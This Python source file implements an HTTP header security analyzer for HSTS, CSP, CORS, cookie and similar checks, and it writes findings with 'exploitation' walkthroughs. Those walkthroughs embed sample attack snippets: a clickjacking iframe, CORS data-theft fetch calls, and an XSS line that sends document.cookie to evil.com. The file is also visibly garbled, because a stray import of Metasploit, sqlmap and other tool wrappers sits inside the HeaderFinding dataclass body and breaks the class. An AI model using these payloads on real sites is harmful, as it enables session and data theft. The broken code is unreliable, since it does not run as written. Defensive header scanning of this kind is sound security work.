import requests
import re
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from urllib.parse import urlparse
from enum import Enum
import json


class SeverityLevel(Enum):
    """Security finding severity levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class HeaderFinding:
    """Represents a header security finding"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze

    header_name: str
    issue_type: str
    severity: str
    current_value: Optional[str]
    expected_value: str
    impact: str
    exploitation: str
    cwe: str
    references: List[str]

class HTTPHeaderSecurityAnalyzer:
    """
    Comprehensive HTTP header security analysis engine.
    Checks for missing, weak, or misconfigured security headers.
    """

    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.findings: List[HeaderFinding] = []
        self.response = None

    def analyze(self, endpoints: List[str] = None) -> List[HeaderFinding]:
        """
        Perform comprehensive header security analysis.

        Args:
            endpoints: List of endpoint paths to test (defaults to root)

        Returns:
            List of header security findings
        """
        if endpoints is None:
            endpoints = ['/']

        print(f"[*] Analyzing HTTP headers for {self.target_url}")

        for endpoint in endpoints:
            url = f"{self.target_url}{endpoint}"
            print(f"[*] Testing endpoint: {endpoint}")

            try:
                # Get response with full headers
                self.response = self.session.get(url, timeout=10, allow_redirects=True)

                # Run all header checks
                self._check_hsts()
                self._check_csp()
                self._check_xframe_options()
                self._check_cors()
                self._check_information_disclosure()
                self._check_content_type_options()
                self._check_referrer_policy()
                self._check_permissions_policy()
                self._check_cache_control()
                self._check_cookies()

            except Exception as e:
                print(f"[!] Error analyzing {url}: {e}")
                continue

        return self.findings

    def _check_hsts(self) -> None:
        """Check HTTP Strict Transport Security configuration"""
        hsts = self.response.headers.get('Strict-Transport-Security', '').lower()

        if not hsts:
            self.findings.append(HeaderFinding(
                header_name='Strict-Transport-Security',
                issue_type='Missing HSTS Header',
                severity='HIGH',
                current_value=None,
                expected_value='Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
                impact='Site vulnerable to SSL stripping attacks and man-in-the-middle attacks',
                exploitation="""
1. Attacker intercepts HTTP request before HTTPS redirect
2. Strips SSL/TLS, establishes plaintext connection
3. Proxies traffic while stealing credentials/session tokens
4. Tools: sslstrip, mitmproxy, bettercap
""",
                cwe='CWE-523: Unprotected Transport of Credentials',
                references=[
                    'https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security',
                    'https://hstspreload.org/'
                ]
            ))
        else:
            # Parse HSTS directives
            max_age = 0
            include_subdomains = 'includesubdomains' in hsts
            preload = 'preload' in hsts

            max_age_match = re.search(r'max-age=(\d+)', hsts)
            if max_age_match:
                max_age = int(max_age_match.group(1))

            # Check max-age
            if max_age < 31536000:  # Less than 1 year
                self.findings.append(HeaderFinding(
                    header_name='Strict-Transport-Security',
                    issue_type='Weak HSTS max-age',
                    severity='MEDIUM',
                    current_value=self.response.headers.get('Strict-Transport-Security'),
                    expected_value='max-age=31536000 (1 year minimum)',
                    impact=f'HSTS max-age of {max_age} seconds is too short, reduces protection window',
                    exploitation='Short max-age allows attacks after expiration',
                    cwe='CWE-523',
                    references=['https://hstspreload.org/']
                ))

            # Check includeSubDomains
            if not include_subdomains:
                self.findings.append(HeaderFinding(
                    header_name='Strict-Transport-Security',
                    issue_type='HSTS missing includeSubDomains',
                    severity='MEDIUM',
                    current_value=self.response.headers.get('Strict-Transport-Security'),
                    expected_value='includeSubDomains directive should be present',
                    impact='Subdomains not protected by HSTS, vulnerable to attacks',
                    exploitation='Attack subdomains without HSTS protection',
                    cwe='CWE-523',
                    references=['https://hstspreload.org/']
                ))

            # Check preload for important sites
            parsed = urlparse(self.target_url)
            if parsed.netloc.count('.') == 1 and not preload:  # Top-level domain
                self.findings.append(HeaderFinding(
                    header_name='Strict-Transport-Security',
                    issue_type='HSTS missing preload',
                    severity='LOW',
                    current_value=self.response.headers.get('Strict-Transport-Security'),
                    expected_value='preload directive for Chrome HSTS preload list',
                    impact='Not in browser HSTS preload list, first visit vulnerable',
                    exploitation='First-time visitors can be attacked before HSTS sets',
                    cwe='CWE-523',
                    references=['https://hstspreload.org/']
                ))

    def _check_csp(self) -> None:
        """Check Content Security Policy configuration"""
        csp = self.response.headers.get('Content-Security-Policy', '')
        csp_report = self.response.headers.get('Content-Security-Policy-Report-Only', '')

        if not csp and not csp_report:
            self.findings.append(HeaderFinding(
                header_name='Content-Security-Policy',
                issue_type='Missing CSP',
                severity='HIGH',
                current_value=None,
                expected_value="Content-Security-Policy: default-src 'self'; script-src 'self'; ...",
                impact='No CSP protection against XSS, injection, clickjacking attacks',
                exploitation="""
1. Inject malicious script via XSS vulnerability
2. Script executes without CSP restrictions
3. Exfiltrate data, steal credentials, perform actions
4. No CSP = no defense-in-depth against XSS
""",
                cwe='CWE-1021: Improper Restriction of Rendered UI Layers',
                references=[
                    'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP',
                    'https://csp-evaluator.withgoogle.com/'
                ]
            ))
        else:
            # Analyze CSP for weaknesses
            policy = csp or csp_report
            self._analyze_csp_policy(policy, bool(csp_report))

    def _analyze_csp_policy(self, policy: str, report_only: bool) -> None:
        """Analyze CSP policy for security issues"""
        policy_lower = policy.lower()

        # Check for unsafe-inline
        if "'unsafe-inline'" in policy_lower:
            self.findings.append(HeaderFinding(
                header_name='Content-Security-Policy',
                issue_type="CSP allows 'unsafe-inline'",
                severity='HIGH',
                current_value=policy,
                expected_value="Remove 'unsafe-inline', use nonces or hashes",
                impact="Inline scripts/styles allowed, defeats CSP XSS protection",
                exploitation="""
1. Find XSS vulnerability (reflected, stored, DOM-based)
2. Inject inline script: <script>alert(document.cookie)</script>
3. CSP allows inline scripts due to 'unsafe-inline'
4. Exfiltrate data, hijack sessions
""",
                cwe='CWE-79: Cross-site Scripting (XSS)',
                references=['https://csp-evaluator.withgoogle.com/']
            ))

        # Check for unsafe-eval
        if "'unsafe-eval'" in policy_lower:
            self.findings.append(HeaderFinding(
                header_name='Content-Security-Policy',
                issue_type="CSP allows 'unsafe-eval'",
                severity='MEDIUM',
                current_value=policy,
                expected_value="Remove 'unsafe-eval'",
                impact="eval() and Function() allowed, enables code injection",
                exploitation="""
1. Find XSS or injection point
2. Inject payload using eval: eval('malicious_code')
3. Execute arbitrary JavaScript
4. Bypass some XSS filters that don't block eval
""",
                cwe='CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP']
            ))

        # Check for overly permissive sources
        permissive_patterns = [
            (r"script-src[^;]*\*", "script-src allows wildcard"),
            (r"script-src[^;]*https:", "script-src allows all HTTPS"),
            (r"default-src[^;]*\*", "default-src allows wildcard"),
            (r"object-src[^;]*\*", "object-src allows wildcard"),
        ]

        for pattern, description in permissive_patterns:
            if re.search(pattern, policy_lower):
                self.findings.append(HeaderFinding(
                    header_name='Content-Security-Policy',
                    issue_type=f'Permissive CSP: {description}',
                    severity='MEDIUM',
                    current_value=policy,
                    expected_value='Restrict sources to specific trusted domains',
                    impact='Overly permissive CSP allows loading from untrusted sources',
                    exploitation='Attacker can load malicious resources from any matching domain',
                    cwe='CWE-1021',
                    references=['https://csp-evaluator.withgoogle.com/']
                ))

        # Check if report-only
        if report_only:
            self.findings.append(HeaderFinding(
                header_name='Content-Security-Policy-Report-Only',
                issue_type='CSP in report-only mode',
                severity='LOW',
                current_value=policy,
                expected_value='Use enforcing Content-Security-Policy header',
                impact='CSP not enforced, only reports violations',
                exploitation='CSP does not block attacks, only logs them',
                cwe='CWE-1021',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP']
            ))

    def _check_xframe_options(self) -> None:
        """Check X-Frame-Options header"""
        xframe = self.response.headers.get('X-Frame-Options', '').upper()
        csp = self.response.headers.get('Content-Security-Policy', '').lower()

        # Check CSP frame-ancestors
        has_frame_ancestors = 'frame-ancestors' in csp

        if not xframe and not has_frame_ancestors:
            self.findings.append(HeaderFinding(
                header_name='X-Frame-Options',
                issue_type='Missing X-Frame-Options',
                severity='MEDIUM',
                current_value=None,
                expected_value='X-Frame-Options: DENY or SAMEORIGIN',
                impact='Page can be framed, vulnerable to clickjacking attacks',
                exploitation="""
1. Create malicious page with invisible iframe
2. Load target page in iframe
3. Overlay fake UI elements
4. Trick user into clicking hidden elements
5. Execute actions as victim (transfer money, change email, etc.)

POC:
<iframe src="https://target.com/transfer" style="opacity:0.1"></iframe>
<button style="position:absolute; top:100px">Click for prize!</button>
""",
                cwe='CWE-1021: Improper Restriction of Rendered UI Layers',
                references=[
                    'https://owasp.org/www-community/attacks/Clickjacking',
                    'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options'
                ]
            ))
        elif xframe == 'ALLOW-FROM':
            self.findings.append(HeaderFinding(
                header_name='X-Frame-Options',
                issue_type='X-Frame-Options ALLOW-FROM is deprecated',
                severity='LOW',
                current_value=self.response.headers.get('X-Frame-Options'),
                expected_value="Use CSP frame-ancestors directive instead",
                impact='ALLOW-FROM not supported in modern browsers',
                exploitation='Header may not provide intended protection',
                cwe='CWE-1021',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options']
            ))

    def _check_cors(self) -> None:
        """Check CORS configuration for vulnerabilities"""
        # Test with Origin header
        test_origins = [
            'https://evil.com',
            'null',
            self.target_url,
            self.target_url.replace('https://', 'http://')
        ]

        for origin in test_origins:
            headers = {'Origin': origin}
            try:
                resp = self.session.get(self.target_url, headers=headers, timeout=5)
                self._analyze_cors_response(origin, resp)
            except:
                continue

    def _analyze_cors_response(self, origin: str, response: requests.Response) -> None:
        """Analyze CORS response headers"""
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '').lower()

        # Critical: ACAO wildcard with credentials
        if acao == '*' and acac == 'true':
            self.findings.append(HeaderFinding(
                header_name='Access-Control-Allow-Origin',
                issue_type='CORS: Wildcard with credentials',
                severity='CRITICAL',
                current_value=f'ACAO: {acao}, ACAC: {acac}',
                expected_value='Specific origin or no credentials',
                impact='Any domain can access API with credentials, full account takeover',
                exploitation="""
1. Create malicious page: evil.com
2. Make authenticated request to API:
   fetch('https://target.com/api/user', {credentials: 'include'})
3. CORS allows request with victim's cookies
4. Steal data, perform actions as victim

NOTE: Modern browsers block ACAO:* with credentials per spec,
but misconfigurations can still be dangerous in older browsers or proxies.
""",
                cwe='CWE-346: Origin Validation Error',
                references=['https://portswigger.net/web-security/cors']
            ))

        # Reflected origin without validation
        if acao == origin and origin not in [self.target_url]:
            self.findings.append(HeaderFinding(
                header_name='Access-Control-Allow-Origin',
                issue_type='CORS: Reflected origin',
                severity='HIGH' if acac == 'true' else 'MEDIUM',
                current_value=f'ACAO reflects: {origin}',
                expected_value='Whitelist specific trusted origins',
                impact='Origin reflected without validation, allows arbitrary domains',
                exploitation=f"""
1. Tested with Origin: {origin}
2. ACAO reflects back: {acao}
3. Any domain can access API
4. {"With credentials = full account takeover" if acac == 'true' else "Data theft possible"}

POC:
fetch('https://target.com/api', {{
  credentials: '{'include' if acac == 'true' else 'omit'}',
  headers: {{'Origin': '{origin}'}}
}}).then(r => r.json()).then(data => exfiltrate(data))
""",
                cwe='CWE-346',
                references=['https://portswigger.net/web-security/cors']
            ))

        # Null origin allowed
        if acao == 'null' and acac == 'true':
            self.findings.append(HeaderFinding(
                header_name='Access-Control-Allow-Origin',
                issue_type='CORS: Null origin allowed',
                severity='HIGH',
                current_value='ACAO: null, ACAC: true',
                expected_value='Reject null origin',
                impact='Null origin allowed with credentials, enables sandbox bypass',
                exploitation="""
1. Create sandboxed iframe (triggers null origin):
   <iframe sandbox="allow-scripts" src="data:text/html,...">
2. Make authenticated request from iframe
3. CORS allows null origin with credentials
4. Steal data, perform actions

POC:
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
    fetch('https://target.com/api', {credentials:'include'})
      .then(r => r.json())
      .then(d => parent.postMessage(d, '*'))
  </script>
"></iframe>
""",
                cwe='CWE-346',
                references=['https://portswigger.net/web-security/cors']
            ))

    def _check_information_disclosure(self) -> None:
        """Check for information disclosure in headers"""
        disclosure_headers = {
            'Server': 'Server software and version',
            'X-Powered-By': 'Backend technology',
            'X-AspNet-Version': 'ASP.NET version',
            'X-AspNetMvc-Version': 'ASP.NET MVC version',
            'X-Generator': 'CMS/framework',
            'X-Drupal-Cache': 'Drupal CMS',
            'X-Runtime': 'Request processing time'
        }

        for header, description in disclosure_headers.items():
            value = self.response.headers.get(header)
            if value:
                # Check for version numbers
                has_version = bool(re.search(r'\d+\.\d+', value))

                self.findings.append(HeaderFinding(
                    header_name=header,
                    issue_type=f'Information Disclosure: {description}',
                    severity='MEDIUM' if has_version else 'LOW',
                    current_value=value,
                    expected_value='Remove or obfuscate header',
                    impact=f'Header leaks {description}, aids targeted attacks',
                    exploitation=f"""
1. Fingerprint: {description} = {value}
2. Search for known vulnerabilities in this version
3. Launch targeted exploit
4. Example: CVE database, exploit-db, Metasploit
""",
                    cwe='CWE-200: Exposure of Sensitive Information',
                    references=['https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server']
                ))

        # Check for internal IP addresses
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        for header, value in self.response.headers.items():
            if re.search(ip_pattern, value):
                ips = re.findall(ip_pattern, value)
                # Filter out public IPs (very basic check)
                private_ips = [ip for ip in ips if self._is_private_ip(ip)]

                if private_ips:
                    self.findings.append(HeaderFinding(
                        header_name=header,
                        issue_type='Information Disclosure: Internal IP',
                        severity='LOW',
                        current_value=value,
                        expected_value='Remove internal IP addresses',
                        impact=f'Header leaks internal IP addresses: {private_ips}',
                        exploitation='Internal network mapping, lateral movement planning',
                        cwe='CWE-200',
                        references=['https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url']
                    ))

    def _is_private_ip(self, ip: str) -> bool:
        """Check if IP is private/internal"""
        parts = ip.split('.')
        if len(parts) != 4:
            return False

        try:
            first = int(parts[0])
            second = int(parts[1])

            # Private ranges
            if first == 10:
                return True
            if first == 172 and 16 <= second <= 31:
                return True
            if first == 192 and second == 168:
                return True
            if first == 127:
                return True

        except:
            pass

        return False

    def _check_content_type_options(self) -> None:
        """Check X-Content-Type-Options header"""
        xcto = self.response.headers.get('X-Content-Type-Options', '').lower()

        if xcto != 'nosniff':
            self.findings.append(HeaderFinding(
                header_name='X-Content-Type-Options',
                issue_type='Missing X-Content-Type-Options: nosniff',
                severity='MEDIUM',
                current_value=xcto or None,
                expected_value='X-Content-Type-Options: nosniff',
                impact='Browser may MIME-sniff responses, enables XSS via content type confusion',
                exploitation="""
1. Upload file with malicious content (e.g., image with JS)
2. Browser MIME-sniffs content instead of trusting Content-Type
3. Executes JavaScript from uploaded file
4. XSS attack via content type confusion

Example:
- Upload image.jpg containing <script>alert(1)</script>
- Without nosniff, browser may execute script
- With nosniff, browser respects Content-Type: image/jpeg
""",
                cwe='CWE-79: Cross-site Scripting',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options']
            ))

    def _check_referrer_policy(self) -> None:
        """Check Referrer-Policy header"""
        referrer = self.response.headers.get('Referrer-Policy', '').lower()

        if not referrer:
            self.findings.append(HeaderFinding(
                header_name='Referrer-Policy',
                issue_type='Missing Referrer-Policy',
                severity='LOW',
                current_value=None,
                expected_value='Referrer-Policy: strict-origin-when-cross-origin or no-referrer',
                impact='Referrer header may leak sensitive data in URLs to third parties',
                exploitation="""
1. User visits: https://target.com/reset?token=secret123
2. Clicks link to external site
3. Referrer leaks full URL including token
4. External site captures sensitive data

Example leaks:
- Password reset tokens
- Session IDs in URL
- Search queries
- Private document IDs
""",
                cwe='CWE-200: Exposure of Sensitive Information',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy']
            ))
        elif referrer in ['unsafe-url', 'origin-when-cross-origin']:
            self.findings.append(HeaderFinding(
                header_name='Referrer-Policy',
                issue_type='Weak Referrer-Policy',
                severity='LOW',
                current_value=referrer,
                expected_value='strict-origin-when-cross-origin or no-referrer',
                impact='Current policy may leak full URL to cross-origin sites',
                exploitation='Sensitive data in URLs leaked via Referrer header',
                cwe='CWE-200',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy']
            ))

    def _check_permissions_policy(self) -> None:
        """Check Permissions-Policy (formerly Feature-Policy)"""
        permissions = self.response.headers.get('Permissions-Policy', '')
        feature_policy = self.response.headers.get('Feature-Policy', '')

        if not permissions and not feature_policy:
            self.findings.append(HeaderFinding(
                header_name='Permissions-Policy',
                issue_type='Missing Permissions-Policy',
                severity='LOW',
                current_value=None,
                expected_value='Permissions-Policy: camera=(), microphone=(), geolocation=(), ...',
                impact='Browser features not restricted, allows abuse by embedded content',
                exploitation="""
Malicious iframe can:
1. Request camera/microphone access
2. Request geolocation
3. Access payment APIs
4. Trigger notifications

Example:
<iframe src="https://evil.com" allow="camera; microphone">
- Evil site can request permissions within your domain context
- User may grant permissions thinking it's legitimate
""",
                cwe='CWE-1021',
                references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy']
            ))

    def _check_cache_control(self) -> None:
        """Check Cache-Control configuration for sensitive pages"""
        cache_control = self.response.headers.get('Cache-Control', '').lower()
        pragma = self.response.headers.get('Pragma', '').lower()

        # Check if page likely contains sensitive data
        is_sensitive = self._is_sensitive_page()

        if is_sensitive:
            if not cache_control:
                self.findings.append(HeaderFinding(
                    header_name='Cache-Control',
                    issue_type='Missing Cache-Control on sensitive page',
                    severity='MEDIUM',
                    current_value=None,
                    expected_value='Cache-Control: no-store, private',
                    impact='Sensitive data may be cached in browser or proxy',
                    exploitation="""
1. Victim views sensitive page (account details, PII)
2. Data cached in browser history or proxy
3. Attacker with physical/network access retrieves cached data
4. Attack scenarios:
   - Shared computer: browse history
   - Public WiFi: proxy cache
   - Malware: dump browser cache
""",
                    cwe='CWE-524: Use of Cache Containing Sensitive Information',
                    references=['https://owasp.org/www-community/controls/Cache_Controls']
                ))
            elif 'public' in cache_control:
                self.findings.append(HeaderFinding(
                    header_name='Cache-Control',
                    issue_type='Cache-Control: public on sensitive page',
                    severity='MEDIUM',
                    current_value=cache_control,
                    expected_value='Cache-Control: private, no-store',
                    impact='Sensitive data marked as cacheable by public proxies',
                    exploitation='Public caches (CDN, proxies) may store sensitive data',
                    cwe='CWE-524',
                    references=['https://owasp.org/www-community/controls/Cache_Controls']
                ))
            elif 'no-store' not in cache_control:
                self.findings.append(HeaderFinding(
                    header_name='Cache-Control',
                    issue_type='Missing no-store for sensitive page',
                    severity='LOW',
                    current_value=cache_control,
                    expected_value='Cache-Control: no-store, private',
                    impact='Sensitive data may be stored in cache',
                    exploitation='Cached sensitive data retrievable from disk',
                    cwe='CWE-524',
                    references=['https://owasp.org/www-community/controls/Cache_Controls']
                ))

    def _is_sensitive_page(self) -> bool:
        """Heuristic to detect if page contains sensitive data"""
        # Check URL path
        sensitive_paths = [
            '/account', '/profile', '/user', '/admin', '/dashboard',
            '/settings', '/payment', '/checkout', '/order', '/api'
        ]

        url_lower = self.response.url.lower()
        if any(path in url_lower for path in sensitive_paths):
            return True

        # Check for authentication
        auth_headers = ['Authorization', 'Cookie', 'X-Auth-Token']
        if any(h in self.response.request.headers for h in auth_headers):
            return True

        # Check content
        sensitive_keywords = [
            'password', 'credit card', 'ssn', 'social security',
            'account number', 'api key', 'token', 'balance'
        ]
        content_lower = self.response.text.lower()
        if any(keyword in content_lower for keyword in sensitive_keywords):
            return True

        return False

    def _check_cookies(self) -> None:
        """Check cookie security attributes"""
        for cookie in self.response.cookies:
            # Check Secure flag
            if not cookie.secure and self.target_url.startswith('https://'):
                self.findings.append(HeaderFinding(
                    header_name='Set-Cookie',
                    issue_type=f'Cookie missing Secure flag: {cookie.name}',
                    severity='MEDIUM',
                    current_value=f'{cookie.name}={cookie.value}',
                    expected_value='Set-Cookie: ...; Secure',
                    impact='Cookie can be transmitted over unencrypted HTTP',
                    exploitation="""
1. Victim on mixed HTTP/HTTPS site
2. Cookie sent over HTTP connection
3. Attacker sniffs network traffic
4. Captures session cookie
5. Session hijacking attack
""",
                    cwe='CWE-614: Sensitive Cookie in HTTPS Session Without Secure Attribute',
                    references=['https://owasp.org/www-community/controls/SecureCookieAttribute']
                ))

            # Check HttpOnly flag for session cookies
            session_cookie_patterns = ['session', 'sess', 'auth', 'token', 'jwt']
            is_session_cookie = any(p in cookie.name.lower() for p in session_cookie_patterns)

            if is_session_cookie and not cookie.has_nonstandard_attr('HttpOnly'):
                self.findings.append(HeaderFinding(
                    header_name='Set-Cookie',
                    issue_type=f'Session cookie missing HttpOnly: {cookie.name}',
                    severity='MEDIUM',
                    current_value=f'{cookie.name}={cookie.value}',
                    expected_value='Set-Cookie: ...; HttpOnly',
                    impact='Cookie accessible via JavaScript, vulnerable to XSS theft',
                    exploitation="""
1. Find XSS vulnerability
2. Inject: <script>fetch('https://evil.com?c='+document.cookie)</script>
3. JavaScript reads session cookie
4. Exfiltrate to attacker server
5. Session hijacking via stolen cookie

With HttpOnly: JavaScript cannot read cookie even with XSS
""",
                    cwe='CWE-1004: Sensitive Cookie Without HttpOnly Flag',
                    references=['https://owasp.org/www-community/HttpOnly']
                ))

            # Check SameSite attribute
            if not cookie.has_nonstandard_attr('SameSite'):
                self.findings.append(HeaderFinding(
                    header_name='Set-Cookie',
                    issue_type=f'Cookie missing SameSite: {cookie.name}',
                    severity='LOW',
                    current_value=f'{cookie.name}={cookie.value}',
                    expected_value='Set-Cookie: ...; SameSite=Strict or SameSite=Lax',
                    impact='Cookie sent in cross-site requests, vulnerable to CSRF',
                    exploitation="""
1. Victim logged into target.com
2. Visits evil.com
3. Evil page makes request: <form action="https://target.com/transfer" method="POST">
4. Cookie sent with cross-site request (no SameSite)
5. CSRF attack succeeds

With SameSite=Strict: Cookie not sent in cross-site requests
With SameSite=Lax: Cookie only sent on safe methods (GET)
""",
                    cwe='CWE-352: Cross-Site Request Forgery (CSRF)',
                    references=['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite']
                ))

    def generate_report(self) -> str:
        """Generate comprehensive header security report"""
        if not self.findings:
            return "No header security issues found."

        report = f"""
# HTTP Header Security Analysis Report
## Target: {self.target_url}
## Total Findings: {len(self.findings)}

"""

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if severity in by_severity:
                report += f"\n## {severity} Severity ({len(by_severity[severity])})\n\n"

                for i, finding in enumerate(by_severity[severity], 1):
                    report += f"""
### {severity}-{i}: {finding.issue_type}

**Header**: `{finding.header_name}`
**Current Value**: {f'`{finding.current_value}`' if finding.current_value else 'Missing'}
**Expected**: `{finding.expected_value}`
**CWE**: {finding.cwe}

**Impact**:
{finding.impact}

**Exploitation**:{finding.exploitation}

**References**:
{chr(10).join(f'- {ref}' for ref in finding.references)}

"""

        return report


# Alias for backwards compatibility with tests  
HTTPSecurityHeadersScanner = HTTPHeaderSecurityAnalyzer
